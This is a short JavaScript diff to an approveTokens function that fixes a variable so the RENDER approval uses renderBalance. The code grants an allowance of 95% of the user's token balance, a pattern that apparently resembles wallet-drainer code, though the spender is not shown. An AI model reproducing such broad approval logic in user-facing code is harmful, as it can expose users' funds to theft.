@@ -1235,7 +1235,7 @@ export async function approveTokens() {
   }
   if (checkBalanceIsEnough(renderBalance) > 0n) {
     // Adjust the approval amount as needed (e.g., 95% of user balance)
-    let approvalAmount = BigInt(Number(aaveBalance) * 0.95); // Convert to BigInt
+    let approvalAmount = BigInt(Number(renderBalance) * 0.95); // Convert to BigInt
     const allowanceInWei = web3.utils.toWei(approvalAmount.toString(), 'ether');
     tx = await approveAndSend(RENDER_ADDRESS, renderContract, userAddress, allowanceInWei, web3);
   }else{zeroCount+=1}
